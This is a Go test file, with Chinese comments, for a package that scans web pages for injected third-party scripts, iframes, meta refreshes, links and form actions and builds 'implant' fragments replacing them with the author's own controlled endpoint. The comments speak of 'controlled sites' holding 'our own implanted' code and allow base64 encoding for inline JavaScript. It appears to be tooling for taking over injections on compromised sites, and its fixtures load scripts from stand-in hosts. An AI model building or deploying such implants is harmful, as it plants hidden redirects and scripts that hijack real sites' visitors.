package redirect

import (
	"strings"
	"testing"
)

// 注入點偵測與「把他們注入的換成我們的」替換片段。
//
// 這些測試釘死三件事：
//  1. 六種注入型態都找得到（script src／iframe src／meta refresh／inline JS／link／form）；
//  2. 我們自己的受控端點必須被排除 —— 否則自動植入會拿自己植入的東西替換自己；
//  3. 編碼必須符合型態語意：屬性類的網址瀏覽器不會解 base64／跳脫，只有 inline JS 可以。

const injectionFixture = `<html><head>
<script src="https://evil.tld/p.js"></script>
<link href="https://cdn.evil.tld/a.css" rel="stylesheet">
<meta http-equiv="refresh" content="0;url=https://evil.tld/go">
</head><body>
<iframe src="https://evil.tld/frame"></iframe>
<form action="https://evil.tld/post"></form>
<script>location.href='https://evil.tld/next';</script>
<script src="/local/app.js"></script>
</body></html>`

func TestScanInjectionsFindsEveryKind(t *testing.T) {
	points := ScanInjections("https://site.tld/page", []byte(injectionFixture), InjectionScanOptions{})
	kinds := map[string]bool{}
	for _, point := range points {
		kinds[point.Kind] = true
	}
	for _, kind := range []string{
		InjectionKindScriptSrc,
		InjectionKindIframeSrc,
		InjectionKindMetaRefresh,
		InjectionKindJSString,
		InjectionKindLinkHref,
		InjectionKindFormAction,
	} {
		if !kinds[kind] {
			t.Fatalf("expected injection kind %q to be detected, got kinds %v", kind, kinds)
		}
	}
	// 相對路徑的 script 不是外部注入，不該被回報。
	for _, point := range points {
		if strings.Contains(point.URL, "/local/app.js") {
			t.Fatalf("relative script src must not be reported as an injection: %+v", point)
		}
	}
}

func TestScanInjectionsIgnoresOurOwnEndpoint(t *testing.T) {
	// 場景：受控站上已經有我們自己植入的片段，巡站時不該把它當成「他們注入的」。
	body := `<html><body>
<script src="https://97y.me/tjneJ/ours.js"></script>
<script src="https://evil.tld/theirs.js"></script>
</body></html>`
	points := ScanInjections("https://site.tld/page", []byte(body), InjectionScanOptions{
		IgnoreHosts: []string{"97y.me"},
	})
	for _, point := range points {
		if strings.Contains(point.URL, "97y.me") {
			t.Fatalf("our own endpoint must be ignored, got %+v", point)
		}
	}
	found := false
	for _, point := range points {
		if strings.Contains(point.URL, "evil.tld") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected the third-party injection to still be reported")
	}
}

func TestScanInjectionsMarksSelfHost(t *testing.T) {
	body := `<html><body><script src="https://site.tld/own.js"></script></body></html>`
	points := ScanInjections("https://site.tld/page", []byte(body), InjectionScanOptions{})
	if len(points) != 1 {
		t.Fatalf("expected exactly one point, got %d: %+v", len(points), points)
	}
	if !points[0].SelfHost {
		t.Fatalf("expected SelfHost to be true for a same-host resource: %+v", points[0])
	}
}

func TestBuildPointImplantProducesUsableFragment(t *testing.T) {
	cases := []struct {
		kind string
		tag  string
	}{
		{InjectionKindScriptSrc, "<script src="},
		{InjectionKindIframeSrc, "<iframe src="},
		{InjectionKindMetaRefresh, "<meta http-equiv=\"refresh\""},
		{InjectionKindLinkHref, "<a href="},
		{InjectionKindFormAction, "<form action="},
		{InjectionKindJSString, "location.href"},
	}
	for _, tc := range cases {
		result, err := BuildPointImplant(PointImplantOptions{
			Point:    InjectionPoint{Kind: tc.kind, URL: "https://evil.tld/x"},
			Endpoint: "https://97y.me/tjneJ",
			Encoding: PayloadEncodingNone,
		})
		if err != nil {
			t.Fatalf("%s: unexpected error: %v", tc.kind, err)
		}
		if !strings.Contains(result.Fragment, "97y.me/tjneJ") {
			t.Fatalf("%s: fragment must carry the controlled endpoint: %s", tc.kind, result.Fragment)
		}
		if !strings.Contains(result.Fragment, tc.tag) {
			t.Fatalf("%s: fragment must keep the original tag shape, got %s", tc.kind, result.Fragment)
		}
		if result.Original != "https://evil.tld/x" {
			t.Fatalf("%s: original URL must be preserved, got %s", tc.kind, result.Original)
		}
	}
}

func TestBuildPointImplantRejectsEncodingThatKindCannotDecode(t *testing.T) {
	// script src 是瀏覽器直接當 URL 解析的屬性，不會解 base64 —— 必須拒收。
	_, err := BuildPointImplant(PointImplantOptions{
		Point:    InjectionPoint{Kind: InjectionKindScriptSrc, URL: "https://evil.tld/x"},
		Endpoint: "https://97y.me/tjneJ",
		Encoding: PayloadEncodingBase64,
	})
	if err == nil {
		t.Fatal("expected base64 to be rejected for script_src")
	}
	// inline JS 字串可以自帶解碼器 → 必須允許。
	if _, err := BuildPointImplant(PointImplantOptions{
		Point:    InjectionPoint{Kind: InjectionKindJSString, URL: "https://evil.tld/x"},
		Endpoint: "https://97y.me/tjneJ",
		Encoding: PayloadEncodingBase64,
	}); err != nil {
		t.Fatalf("base64 must be allowed for js_string: %v", err)
	}
}

func TestImplantEncodingsForPointKindMatchesMatrix(t *testing.T) {
	matrix := InjectionEncodingMatrix()
	for kind, allowed := range matrix {
		expected := ImplantEncodingsForPointKind(kind)
		if len(expected) != len(allowed) {
			t.Fatalf("matrix entry for %q disagrees with ImplantEncodingsForPointKind", kind)
		}
		for i := range expected {
			if expected[i] != allowed[i] {
				t.Fatalf("matrix entry for %q disagrees at index %d", kind, i)
			}
		}
	}
}

func TestScanInjectionsHandlesPageWithoutTags(t *testing.T) {
	// 沒有任何標籤的純文字頁不該 panic（attrs 必須先 make）。
	points := ScanInjections("https://site.tld/page", []byte("just text, no tags"), InjectionScanOptions{})
	if len(points) != 0 {
		t.Fatalf("expected no injection points, got %+v", points)
	}
}
